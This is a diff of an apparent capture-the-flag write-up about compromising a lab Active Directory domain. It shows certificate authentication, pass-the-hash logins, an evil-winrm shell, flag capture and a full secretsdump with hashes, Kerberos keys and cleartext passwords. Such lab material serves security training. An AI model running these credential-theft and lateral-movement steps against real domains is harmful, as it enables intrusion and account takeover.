-krbtgt:des-cbc-md5:fb9d588f4310973b
-tyler:aes256-cts-hmac-sha1-96:221ffb7a3b887e3b58300e44226bb25198c79ee2b751e3ac073d4b0ec5f92b40
-tyler:aes128-cts-hmac-sha1-96:e6636b50c91277e36f6e1e9e1f37cc89
-tyler:des-cbc-md5:5b1f15298ff4fd9e
-ryan:aes256-cts-hmac-sha1-96:8be4dd4033659023f29dec99f24e60ce6be6f9e699abdfdd42ff3a2e84fac60d
-ryan:aes128-cts-hmac-sha1-96:fb848e4c6c94780fe90804c3c4f95119
-ryan:des-cbc-md5:1ff445f72c5497dc
-EC2AMAZ-A5O4OL8$:aes256-cts-hmac-sha1-96:d777798e44de2f5c3b1f24b04e6b87afa6254cddc102a1b7a165aeebdc0f3ff2
-EC2AMAZ-A5O4OL8$:aes128-cts-hmac-sha1-96:21526e717387880866a5b3a6b3e51f7a
-EC2AMAZ-A5O4OL8$:des-cbc-md5:a21a9d70317975ba
-APPDEV01$:aes256-cts-hmac-sha1-96:7077cb6b9b598c710f1c259ff766e65444bcbf31751e659bc249019fa12e857c
-APPDEV01$:aes128-cts-hmac-sha1-96:675f7b2185109b3512653e60f28787e3
-APPDEV01$:des-cbc-md5:7358625e8589d9b6
-WEBDEV01$:aes256-cts-hmac-sha1-96:03182ed7b9279c0920fd707ca0f40def525cbf82e32a39406019114981b12a4a
-WEBDEV01$:aes128-cts-hmac-sha1-96:51fa4d501040fb8e1e2c82568942d79d
-WEBDEV01$:des-cbc-md5:a2cde3df2673ae80
-DEV01$:aes256-cts-hmac-sha1-96:10ed9722eed1d14a369766c556ee0084c2a6aa2efe7bf607ddab413c33215cfb
-DEV01$:aes128-cts-hmac-sha1-96:50842ac087fa42624903f90a89692d9d
-DEV01$:des-cbc-md5:64f2100131023873
-HACKERMANN$:aes256-cts-hmac-sha1-96:c32d6837e9e7df11e84b52bac663999ff8b847bd90da9a64601f2ed896d6437a
-HACKERMANN$:aes128-cts-hmac-sha1-96:dc1559b7654fb3f6a1ba76b2b577a113
-HACKERMANN$:des-cbc-md5:23ae64f7d9c18345
-[*] Cleaning up...
+```jsx
+certipy-ad auth -pfx administrator.pfx -dc-ip 10.0.30.30 
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN UPN: 'Administrator@shadowgate.local'
+[*]     Security Extension SID: 'S-1-5-21-2396436576-3267128377-3646372360-500'
+[*] Using principal: 'administrator@shadowgate.local'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'administrator.ccache'
+[*] Wrote credential cache to 'administrator.ccache'
+[*] Trying to retrieve NT hash for 'administrator'
+[*] Got hash for 'administrator@shadowgate.local': aad3b435b51404eeaad3b435b51404ee:a07b7bbc98b574afe52bbeb5d07d9c0a
 ```
 
-```shellscript
-nxc smb 10.0.20.184 -u 'Administrator' -k --use-kcache --sam secdump
-SMB         10.0.20.184     445    EC2AMAZ-A5O4OL8  [*] Windows Server 2016 Datacenter 14393 x64 (name:EC2AMAZ-A5O4OL8) (domain:past.local) (signing:True) (SMBv1:True) (Null Auth:True)
-SMB         10.0.20.184     445    EC2AMAZ-A5O4OL8  [+] past.local\Administrator from ccache (Pwn3d!)
-SMB         10.0.20.184     445    EC2AMAZ-A5O4OL8  [*] Dumping SAM hashes
-SMB         10.0.20.184     445    EC2AMAZ-A5O4OL8  Administrator:500:aad3b435b51404eeaad3b435b51404ee:31592a42841d0a9e74f93c41d8884cd0:::
-SMB         10.0.20.184     445    EC2AMAZ-A5O4OL8  Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-SMB         10.0.20.184     445    EC2AMAZ-A5O4OL8  DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-SMB         10.0.20.184     445    EC2AMAZ-A5O4OL8  [+] Added 3 SAM hashes to the database
+```jsx
+nxc smb 10.0.30.30 -u 'Administrator' -H aad3b435b51404eeaad3b435b51404ee:a07b7bbc98b574afe52bbeb5d07d9c0a
+SMB         10.0.30.30      445    SG-DC01          [*] Windows 10 / Server 2019 Build 17763 x64 (name:SG-DC01) (domain:shadowgate.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.0.30.30      445    SG-DC01          [+] shadowgate.local\Administrator:a07b7bbc98b574afe52bbeb5d07d9c0a (Pwn3d!)
 ```
 
-```shellscript expandable
-evil-winrm -i 10.0.20.184 -u Administrator -H 31592a42841d0a9e74f93c41d8884cd0
+### Root flag
 
-Evil-WinRM shell v3.5
-
+```jsx
+evil-winrm -i 10.0.30.30 -u 'Administrator' -H a07b7bbc98b574afe52bbeb5d07d9c0a
+                                        
+Evil-WinRM shell v3.9
+                                        
 Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
-
+                                        
 Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
-
+                                        
 Info: Establishing connection to remote endpoint
-*Evil-WinRM* PS C:\Users\Administrator\Documents> dir
 *Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
 *Evil-WinRM* PS C:\Users\Administrator> cd Desktop
 *Evil-WinRM* PS C:\Users\Administrator\Desktop> dir
 
-
-Directory: C:\Users\Administrator\Desktop
-
+    Directory: C:\Users\Administrator\Desktop
 
 Mode                LastWriteTime         Length Name
 ----                -------------         ------ ----
--a----        6/21/2016   3:36 PM            527 EC2 Feedback.website
--a----        6/21/2016   3:36 PM            554 EC2 Microsoft Windows Guide.website
--a----        1/24/2026   7:30 PM             76 root.txt
-
+-a----        12/5/2025   7:08 AM           4788 root.txt
 
 *Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
-HSM{HFIU9259FJHJKB0918fsKJGHSFHFHJ}
+
+FLAG[SamH_Tombstone_Records_NoLongerExists_But_Backups_NeverForget]
 ```
 
-```shellscript
-sudo john --wordlist=/usr/share/wordlists/rockyou.txt ryan.hash --format=LM
-Using default input encoding: UTF-8
-Using default target encoding: CP850
-Loaded 2 password hashes with no different salts (LM [DES 256/256 AVX2])
-Warning: poor OpenMP scalability for this hash type, consider --fork=4
-Will run 4 OpenMP threads
-Press 'q' or Ctrl-C to abort, almost any other key for status
-0g 0:00:00:01 DONE (2026-08-01 18:23) 0g/s 5619Kp/s 5619Kc/s 11239KC/s !!1QWER..*7¡VA
-Session completed.
+### Secret Dump
+
+```jsx
+impacket-secretsdump SG-DC01.shadowgate.local/administrator@10.0.30.30 -hashes aad3b435b51404eeaad3b435b51404ee:a07b7bbc98b574afe52bbeb5d07d9c0a
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Service RemoteRegistry is in stopped state
+[*] Starting service RemoteRegistry
+[*] Target system bootKey: 0xae278db50ce9bcfbb2a5d76d8deabeb2
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:7abb6dca51f707c29ac3a28ae4d61f52:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+[*] Dumping cached domain logon information (domain/username:hash)
+[*] Dumping LSA Secrets
+[*] $MACHINE.ACC 
+SHADOWGATE\SG-DC01$:aes256-cts-hmac-sha1-96:82ea428945993b216380cd1a43c271b3e14d0499a84a2392b290cb1b0812b931
+SHADOWGATE\SG-DC01$:aes128-cts-hmac-sha1-96:134a1031f4178e508478c4db9dd2a0dd
+SHADOWGATE\SG-DC01$:des-cbc-md5:b345494a201cc738
+SHADOWGATE\SG-DC01$:plain_password_hex:15c779e4ded0f9ed9dc87d80709393a0eede0abee8ae2d818e3035148fc54f9493dcbb176ebdcc20db7bd851f7227b69fb66a866dac180fd6c721b255ae1f9d42b1f05106e60e9c2bce50e71fb70a10da0707027afa12d98ec2d4822b707974e2b2085bc31c138f037ddfb3e4fad4fb4ac8082b7ed1acf1e93692034423f616e22b5ed7721359fcbdbda46966cbc3b84fc380fe3c3900ad030c71a4d4e7690a1332ebf15dae4d8b5be20f988e711c175a8aa32d0029d44b1017b63aa67aa2b687b593f38fbea9cab7d7ee14ab5d457b5a4854bfe364782c9919140f601347985c99b300a50ef698abf7048ea48a54c04
+SHADOWGATE\SG-DC01$:aad3b435b51404eeaad3b435b51404ee:4e5f1cb62a45b52b863ea3d2b9f7db89:::
+[*] DefaultPassword 
+SHADOWGATE\mitch.r:snitch1993
+[*] DPAPI_SYSTEM 
+dpapi_machinekey:0xea4f4173267ceeeeea7a2c15addf9b7ea792ae78
+dpapi_userkey:0x14fab671634a0968788792529b3b8c0d80fcc88e
+[*] NL$KM 
+ 0000   17 E4 00 89 13 25 06 E3  66 3F 05 90 27 9C E5 92   .....%..f?..'...
+ 0010   FB 9C F3 2B 35 C7 B4 BD  70 54 DB 5A 2E 9A E0 3F   ...+5...pT.Z...?
+ 0020   3D 34 89 C8 F8 12 9D FA  57 5F A3 2E 7E 7B CF 4B   =4......W_..~{.K
+ 0030   15 5A 0A F1 F2 2E 91 3B  2D B9 5A 08 0C F7 29 5A   .Z.....;-.Z...)Z
+NL$KM:17e40089132506e3663f0590279ce592fb9cf32b35c7b4bd7054db5a2e9ae03f3d3489c8f8129dfa575fa32e7e7bcf4b155a0af1f22e913b2db95a080cf7295a
+[*] _SC_MSSQL$SQLEXPRESS 
+SHADOWGATE\bogdan.r:bogdan0126
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:a07b7bbc98b574afe52bbeb5d07d9c0a:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:e910fc44934141133f04d9d28e5a841d:::
+shadowgate.local\daniel.r:1104:aad3b435b51404eeaad3b435b51404ee:5f5af561250e5eb255c38a219b6308b3:::
+shadowgate.local\ryan.j:1105:aad3b435b51404eeaad3b435b51404ee:6ffec07abeefb12419ac2f7660fa2ba6:::
+shadowgate.local\svc_mssql:1106:aad3b435b51404eeaad3b435b51404ee:8198a0b3f22a084be8867cf6b50dd24a:::
+shadowgate.local\mitch.r:1107:aad3b435b51404eeaad3b435b51404ee:d877bccd04b6d4224b8072bda7bd9548:::
+shadowgate.local\milo.w:1108:aad3b435b51404eeaad3b435b51404ee:fb54d1c05e301e024800c6ad99fe9b45:::
+shadowgate.local\oscar.m:1109:aad3b435b51404eeaad3b435b51404ee:8198a0b3f22a084be8867cf6b50dd24a:::
+shadowgate.local\bogdan.r:1111:aad3b435b51404eeaad3b435b51404ee:470ab5a29ff5a48df81de5f7e093b1a0:::
+shadowgate.local\sam.h:1114:aad3b435b51404eeaad3b435b51404ee:8198a0b3f22a084be8867cf6b50dd24a:::
+SG-DC01$:1000:aad3b435b51404eeaad3b435b51404ee:4e5f1cb62a45b52b863ea3d2b9f7db89:::
+[*] Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:bc959c1cf67923ca669127cf37881f6df351016bddc36dd1aef91f3caa1ada86
+Administrator:aes128-cts-hmac-sha1-96:84ba63bbd38ca85f8ba57bba108e0310
+Administrator:des-cbc-md5:1f385468621307ce
+krbtgt:aes256-cts-hmac-sha1-96:2027d02a8db1f049ce3042d41521a10cdf33b1e0f5c7323069d0f1b93c2976fe
+krbtgt:aes128-cts-hmac-sha1-96:af4dbd62a5d65f0e6757eb1c1e0f6c50
+krbtgt:des-cbc-md5:40dfa702756dd02c
+shadowgate.local\daniel.r:aes256-cts-hmac-sha1-96:b96208965f6f509600df726959dad2f5acf32e2ad50fb2e2ed1db85efa53653b
+shadowgate.local\daniel.r:aes128-cts-hmac-sha1-96:567a2a1a6800802b795d20dee4a6d526
+shadowgate.local\daniel.r:des-cbc-md5:544f34769bf7920e
+shadowgate.local\ryan.j:aes256-cts-hmac-sha1-96:347762889f71d5961b427b0bd83ebef0c69de5b7024c81bb0d430dcffceee966
+shadowgate.local\ryan.j:aes128-cts-hmac-sha1-96:5eec1e96e321a70cc1110549425aebf1
+shadowgate.local\ryan.j:des-cbc-md5:927c431667f14fce
+shadowgate.local\svc_mssql:aes256-cts-hmac-sha1-96:530d8da4f58eba0fd0e9b69a043c90581ea1fa92939613d45b047755c42f6b6a
+shadowgate.local\svc_mssql:aes128-cts-hmac-sha1-96:c0ef32509c092cf1932c7777f605b081
+shadowgate.local\svc_mssql:des-cbc-md5:3d5d5764f7da7c15
+shadowgate.local\mitch.r:aes256-cts-hmac-sha1-96:303099b1647b7f308175ed4b39a99e4a6e3843c40748278ce7e8689f0ddb78db
+shadowgate.local\mitch.r:aes128-cts-hmac-sha1-96:e9965c8d405d51158005948f90c47d35
+shadowgate.local\mitch.r:des-cbc-md5:dab540c47a34c4df
+shadowgate.local\milo.w:aes256-cts-hmac-sha1-96:cf4b61997d2621dcd30365908bab5fe10d3f73e63b7faf7d19d4e2738b37367c
+shadowgate.local\milo.w:aes128-cts-hmac-sha1-96:8c07db87848278f999e3b6f004659f3f
+shadowgate.local\milo.w:des-cbc-md5:8c6d6b469ea26229
+shadowgate.local\oscar.m:aes256-cts-hmac-sha1-96:40f7c44e135d7a96fa94db3af7157c7a8c1843df5fed0d5a13ebca32b13a269f
+shadowgate.local\oscar.m:aes128-cts-hmac-sha1-96:ae2aa86c84494ef719d2205db6a9156f
+shadowgate.local\oscar.m:des-cbc-md5:5707c715c838bccb
+shadowgate.local\bogdan.r:aes256-cts-hmac-sha1-96:acfe127f59371f290455dc23bd86694a641eba5a9370aa8a7824fe3734a5a31a
+shadowgate.local\bogdan.r:aes128-cts-hmac-sha1-96:76f9d36ff81cf0ad2cd5a8832013a986
+shadowgate.local\bogdan.r:des-cbc-md5:cdab54864625d38a
+shadowgate.local\sam.h:aes256-cts-hmac-sha1-96:21aae69ad00279e838a3054d0e465973762ac6f6073cb29b2c44a920c990bfdb
+shadowgate.local\sam.h:aes128-cts-hmac-sha1-96:323bd0002e1cfdae743cd3116ac53763
+shadowgate.local\sam.h:des-cbc-md5:649e8540fed03152
+SG-DC01$:aes256-cts-hmac-sha1-96:82ea428945993b216380cd1a43c271b3e14d0499a84a2392b290cb1b0812b931
+SG-DC01$:aes128-cts-hmac-sha1-96:134a1031f4178e508478c4db9dd2a0dd
+SG-DC01$:des-cbc-md5:c745e6f47562d62a
+[*] ClearText passwords grabbed
+Administrator:CLEARTEXT:pa$$w0rd1986
+shadowgate.local\svc_mssql:CLEARTEXT:Valentino1@
+shadowgate.local\mitch.r:CLEARTEXT:snitch1993
+shadowgate.local\milo.w:CLEARTEXT:newP@ssword2022
+shadowgate.local\oscar.m:CLEARTEXT:Valentino1@
+shadowgate.local\bogdan.r:CLEARTEXT:bogdan0126
+shadowgate.local\sam.h:CLEARTEXT:Valentino1@
+SG-DC01$:CLEARTEXT:0x15c779e4ded0f9ed9dc87d80709393a0eede0abee8ae2d818e3035148fc54f9493dcbb176ebdcc20db7bd851f7227b69fb66a866dac180fd6c721b255ae1f9d42b1f05106e60e9c2bce50e71fb70a10da0707027afa12d98ec2d4822b707974e2b2085bc31c138f037ddfb3e4fad4fb4ac8082b7ed1acf1e93692034423f616e22b5ed7721359fcbdbda46966cbc3b84fc380fe3c3900ad030c71a4d4e7690a1332ebf15dae4d8b5be20f988e711c175a8aa32d0029d44b1017b63aa67aa2b687b593f38fbea9cab7d7ee14ab5d457b5a4854bfe364782c9919140f601347985c99b300a50ef698abf7048ea48a54c04
+[*] Cleaning up... 
 ```
 
-```shellscript
-*Evil-WinRM* PS C:\Users\Administrator\Documents> cat C:\Users\Administrator\APPDATA\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+# Resources used
 
-net user ryan 1qaz3edc!QAZ#EDC /add
-net localgroup administrators /add ryan
-exit
-net computer
-Get-ADComputer -Filter * | Select-Object Name
-net use \\dev01\c$
-whoami
-id
-net localgroup administrators
-net group "domain admins"
-exi
-```
+Action items, timeline, and resource requirements
